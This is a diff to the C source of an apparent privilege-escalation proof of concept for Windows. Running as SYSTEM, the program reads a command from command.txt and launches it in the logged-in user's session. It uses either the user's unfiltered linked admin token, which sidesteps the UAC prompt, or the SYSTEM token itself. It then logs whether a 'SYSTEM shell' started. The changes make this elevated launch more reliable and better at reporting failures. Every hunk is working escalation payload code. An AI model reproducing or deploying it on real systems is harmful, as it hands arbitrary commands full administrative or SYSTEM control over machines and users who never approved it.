@@ -90,7 +90,7 @@ static void append_line(const wchar_t* path, const char* line, size_t len)
 
 static void write_event(const wchar_t* path, const char* name,
                         DWORD child_pid, DWORD session, DWORD error,
-                        const char* how)
+                        const char* how, const char* user)
 {
     char     line[1024];
     char*    cursor = line;
@@ -108,14 +108,16 @@ static void write_event(const wchar_t* path, const char* name,
     cursor = a_append_num(cursor, end, error);
     cursor = a_append(cursor, end, " how=");
     cursor = a_append(cursor, end, how);
-    cursor = a_append(cursor, end, " user=SYSTEM\r\n");
+    cursor = a_append(cursor, end, " user=");
+    cursor = a_append(cursor, end, (user && *user) ? user : "?");
+    cursor = a_append(cursor, end, "\r\n");
 
     append_line(path, line, (size_t)(cursor - line));
 }
 
 /* Step-level diagnostics.  The trigger only matches event=SYSTEM_SHELL_*;
-   everything else here is for the elevation log (bin\bypass_elevate.log),
-   which shows the tail of this file when something fails. */
+   everything else here is for the elevation log (bin\bypass_hook.log, the one
+   shared log), which shows the tail of this file when something fails. */
 static void write_note(const wchar_t* path, const char* text)
 {
     char     line[512];
@@ -158,6 +160,12 @@ static int read_command(const wchar_t* cmd_path, wchar_t* out, int cch)
         const wchar_t* src = (const wchar_t*)buf;
         if (n > 0 && src[0] == 0xFEFF) start = 1;
         for (i = 0; start + i < n && i + 1 < cch; i++) out[i] = src[start + i];
+        /* PowerShell's WriteAllText may keep a trailing CRLF: it would end up
+           in the child's command line.  Trim trailing whitespace / NULs. */
+        while (i > 0 && (out[i - 1] == L'\r' || out[i - 1] == L'\n' ||
+                         out[i - 1] == L' '  || out[i - 1] == L'\t' ||
+                         out[i - 1] == 0))
+            i--;
         out[i] = 0;
     }
     HeapFree(GetProcessHeap(), 0, buf);
@@ -170,14 +178,48 @@ static int read_command(const wchar_t* cmd_path, wchar_t* out, int cch)
 
 /* ---------------- tokens ---------------- */
 
-static void enable_privilege(HANDLE token, const wchar_t* name)
+/* Returns 1 only when the privilege is really enabled: AdjustTokenPrivileges
+   succeeds even when the caller does not hold the privilege (it then reports
+   ERROR_NOT_ALL_ASSIGNED), and the silent failure surfaces later as a
+   confusing CreateProcessAsUser error 1314. */
+static int enable_privilege(HANDLE token, const wchar_t* name)
 {
     TOKEN_PRIVILEGES tp;
+
     ZeroMemory(&tp, sizeof(tp));
     tp.PrivilegeCount = 1;
-    if (!LookupPrivilegeValueW(NULL, name, &tp.Privileges[0].Luid)) return;
+    if (!LookupPrivilegeValueW(NULL, name, &tp.Privileges[0].Luid)) return 0;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
+    SetLastError(ERROR_SUCCESS);
+    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL)) return 0;
+    return GetLastError() == ERROR_SUCCESS ? 1 : 0;
+}
+
+/* Account name behind a token, for the event line.  Kept ASCII: the result
+   file must stay pure ASCII, so every non-ASCII byte becomes '?'. */
+static void token_user_name(HANDLE token, char* out, size_t cch)
+{
+    BYTE        buf[sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE + 8];
+    DWORD       len = 0;
+    char        name[96] = "?";
+    char        dom[96]  = "?";
+    DWORD       nlen = sizeof(name), dlen = sizeof(dom);
+    SID_NAME_USE use;
+    TOKEN_USER* tu;
+    size_t      i;
+
+    if (!out || !cch) return;
+    out[0] = 0;
+    if (!token) return;
+    if (!GetTokenInformation(token, TokenUser, buf, sizeof(buf), &len)) return;
+    tu = (TOKEN_USER*)buf;
+    if (!LookupAccountSidA(NULL, tu->User.Sid, name, &nlen, dom, &dlen, &use))
+        _snprintf(out, cch - 1, "sid-unresolved");
+    else
+        _snprintf(out, cch - 1, "%s\\%s", dom, name);
+    out[cch - 1] = 0;
+    for (i = 0; out[i]; i++)
+        if ((unsigned char)out[i] > 0x7E || (unsigned char)out[i] < 0x20) out[i] = '?';
 }
 
 /* Raise an existing user token to High integrity: the child is a real
@@ -295,7 +337,7 @@ static int token_is_admin(HANDLE primary)
    child, which then had to pop UAC anyway).  The unfiltered token is linked to
    it, and a SYSTEM caller with SeTcbPrivilege may fetch it. */
 static int launch_as_user(DWORD session, const wchar_t* cmd, const wchar_t* result,
-                          DWORD* out_pid)
+                          DWORD* out_pid, DWORD* out_err, char* who, size_t cch)
 {
     HANDLE sessionTok = NULL, tok = NULL, primary = NULL;
     DWORD  err = 0;
@@ -303,11 +345,13 @@ static int launch_as_user(DWORD session, const wchar_t* cmd, const wchar_t* resu
     int    ok = 0;
 
     if (!WTSQueryUserToken(session, &sessionTok)) {
+        err = GetLastError();
         _snprintf(note, sizeof(note) - 1,
                   "user-path WTSQueryUserToken(session=%lu) err=%lu",
-                  (unsigned long)session, (unsigned long)GetLastError());
+                  (unsigned long)session, (unsigned long)err);
         note[sizeof(note) - 1] = 0;
         write_note(result, note);
+        if (out_err) *out_err = err;
         return 0;
     }
     tok = sessionTok;
@@ -332,11 +376,13 @@ static int launch_as_user(DWORD session, const wchar_t* cmd, const wchar_t* resu
 
     if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                           TokenPrimary, &primary)) {
+        err = GetLastError();
         _snprintf(note, sizeof(note) - 1,
-                  "user-path DuplicateTokenEx err=%lu", (unsigned long)GetLastError());
+                  "user-path DuplicateTokenEx err=%lu", (unsigned long)err);
         note[sizeof(note) - 1] = 0;
         write_note(result, note);
         CloseHandle(tok);
+        if (out_err) *out_err = err;
         return 0;
     }
 
@@ -345,8 +391,11 @@ static int launch_as_user(DWORD session, const wchar_t* cmd, const wchar_t* resu
                            "trying the SYSTEM path instead");
         CloseHandle(primary);
         CloseHandle(tok);
+        if (out_err) *out_err = ERROR_PRIVILEGE_NOT_HELD;
         return 0;
     }
+
+    token_user_name(primary, who, cch);
 
     /* The linked token is High already; keep the write as belt and braces. */
     if (!set_integrity_high(primary)) {
@@ -363,6 +412,7 @@ static int launch_as_user(DWORD session, const wchar_t* cmd, const wchar_t* resu
                   "user-path CreateProcessAsUserW err=%lu", (unsigned long)err);
         note[sizeof(note) - 1] = 0;
         write_note(result, note);
+        if (out_err) *out_err = err;
     }
     CloseHandle(primary);
     CloseHandle(tok);
@@ -371,45 +421,56 @@ static int launch_as_user(DWORD session, const wchar_t* cmd, const wchar_t* resu
 
 /* our own SYSTEM token in the user's session (the original PoC behaviour) */
 static int launch_as_system(DWORD session, const wchar_t* cmd, const wchar_t* result,
-                            DWORD* out_pid, DWORD* out_err)
+                            DWORD* out_pid, DWORD* out_err, char* who, size_t cch)
 {
     HANDLE process_token = NULL, primary = NULL;
     DWORD  err = 0;
     char   note[192];
     int    ok = 0;
 
+    if (who && cch) _snprintf(who, cch - 1, "SYSTEM");
+    if (who && cch) who[cch - 1] = 0;
+
     if (!OpenProcessToken(GetCurrentProcess(),
                           TOKEN_QUERY | TOKEN_DUPLICATE |
                           TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_PRIVILEGES,
                           &process_token)) {
+        err = GetLastError();
         _snprintf(note, sizeof(note) - 1,
-                  "system-path OpenProcessToken err=%lu", (unsigned long)GetLastError());
+                  "system-path OpenProcessToken err=%lu", (unsigned long)err);
         note[sizeof(note) - 1] = 0;
         write_note(result, note);
+        if (out_err) *out_err = err;
         return 0;
     }
 
-    enable_privilege(process_token, L"SeAssignPrimaryTokenPrivilege");
-    enable_privilege(process_token, L"SeIncreaseQuotaPrivilege");
-    enable_privilege(process_token, L"SeTcbPrivilege");
+    if (!enable_privilege(process_token, L"SeAssignPrimaryTokenPrivilege") ||
+        !enable_privilege(process_token, L"SeIncreaseQuotaPrivilege") ||
+        !enable_privilege(process_token, L"SeTcbPrivilege"))
+        write_note(result, "system-path privilege not enabled - "
+                           "CreateProcessAsUser may fail with 1314");
 
     if (!DuplicateTokenEx(process_token, MAXIMUM_ALLOWED, NULL,
                           SecurityImpersonation, TokenPrimary, &primary)) {
+        err = GetLastError();
         _snprintf(note, sizeof(note) - 1,
-                  "system-path DuplicateTokenEx err=%lu", (unsigned long)GetLastError());
+                  "system-path DuplicateTokenEx err=%lu", (unsigned long)err);
         note[sizeof(note) - 1] = 0;
         write_note(result, note);
         CloseHandle(process_token);
+        if (out_err) *out_err = err;
         return 0;
     }
     if (!SetTokenInformation(primary, TokenSessionId, &session, sizeof(session))) {
+        err = GetLastError();
         _snprintf(note, sizeof(note) - 1,
                   "system-path SetTokenInformation(SessionId=%lu) err=%lu",
-                  (unsigned long)session, (unsigned long)GetLastError());
+                  (unsigned long)session, (unsigned long)err);
         note[sizeof(note) - 1] = 0;
         write_note(result, note);
         CloseHandle(primary);
         CloseHandle(process_token);
+        if (out_err) *out_err = err;
         return 0;
     }
     ok = spawn(primary, cmd, out_pid, &err);
@@ -433,6 +494,7 @@ int main(void)
     wchar_t  cmd[2048];
     DWORD    session, child = 0, error = ERROR_SUCCESS;
     const char* how = "none";
+    char     who[96] = "-";
     int      ok;
 
     argv = CommandLineToArgvW(GetCommandLineW(), &argc);
@@ -442,13 +504,22 @@ int main(void)
     }
 
     /* SYSTEM has these by default; enabling them explicitly costs nothing and
-       keeps the two launch paths below independent of the default token. */
+       keeps the two launch paths below independent of the default token.
+       Report the ones we did not get: a missing SeTcbPrivilege / SeAssign-
+       PrimaryTokenPrivilege surfaces later as "CreateProcessAsUser err=1314",
+       which says nothing about the real cause. */
     {
         HANDLE self = NULL;
-        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &self)) {
-            enable_privilege(self, L"SeTcbPrivilege");
-            enable_privilege(self, L"SeAssignPrimaryTokenPrivilege");
-            enable_privilege(self, L"SeIncreaseQuotaPrivilege");
+        if (!OpenProcessToken(GetCurrentProcess(),
+                              TOKEN_ADJUST_PRIVILEGES, &self)) {
+            write_note(argv[1], "cannot open own token");
+        } else {
+            if (!enable_privilege(self, L"SeTcbPrivilege"))
+                write_note(argv[1], "SeTcbPrivilege not held");
+            if (!enable_privilege(self, L"SeAssignPrimaryTokenPrivilege"))
+                write_note(argv[1], "SeAssignPrimaryTokenPrivilege not held");
+            if (!enable_privilege(self, L"SeIncreaseQuotaPrivilege"))
+                write_note(argv[1], "SeIncreaseQuotaPrivilege not held");
             CloseHandle(self);
         }
     }
@@ -456,7 +527,7 @@ int main(void)
     if (!sibling_path(argv[1], L"command.txt", cmd_path, MAX_PATH) ||
         !read_command(cmd_path, cmd, 2048)) {
         write_event(argv[1], "SYSTEM_SHELL_FAILED", 0, 0,
-                    ERROR_FILE_NOT_FOUND, how);
+                    ERROR_FILE_NOT_FOUND, how, who);
         LocalFree(argv);
         return ERROR_FILE_NOT_FOUND;
     }
@@ -464,25 +535,25 @@ int main(void)
     session = active_session();
     if (session == 0xFFFFFFFF) {
         write_event(argv[1], "SYSTEM_SHELL_FAILED", 0, 0,
-                    ERROR_NO_SUCH_LOGON_SESSION, how);
+                    ERROR_NO_SUCH_LOGON_SESSION, how, who);
         LocalFree(argv);
         return ERROR_NO_SUCH_LOGON_SESSION;
     }
 
     how = "user-linked";
-    ok = launch_as_user(session, cmd, argv[1], &child);
+    ok = launch_as_user(session, cmd, argv[1], &child, &error, who, sizeof(who));
     if (!ok) {
         how = "system";
-        ok = launch_as_system(session, cmd, argv[1], &child, &error);
+        ok = launch_as_system(session, cmd, argv[1], &child, &error,
+                              who, sizeof(who));
     }
     if (!ok) {
-        if (!error) error = GetLastError();
-        write_event(argv[1], "SYSTEM_SHELL_FAILED", 0, session, error, how);
+        write_event(argv[1], "SYSTEM_SHELL_FAILED", 0, session, error, how, who);
         LocalFree(argv);
         return (int)error;
     }
 
-    write_event(argv[1], "SYSTEM_SHELL_STARTED", child, session, 0, how);
+    write_event(argv[1], "SYSTEM_SHELL_STARTED", child, session, 0, how, who);
     LocalFree(argv);
     return 0;
 }
